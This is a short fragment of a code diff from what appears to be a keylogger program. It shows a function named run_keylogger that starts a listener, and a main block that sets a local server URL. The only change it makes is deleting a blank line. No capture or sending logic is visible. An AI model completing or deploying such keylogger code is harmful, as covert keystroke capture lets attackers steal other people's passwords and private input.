@@ -225,7 +225,6 @@ def run_keylogger():
     listener.start()
     return listener
 
-
 # === Main ===
 if __name__ == '__main__':
     SERVER_URL = "http://127.0.0.1:7000"
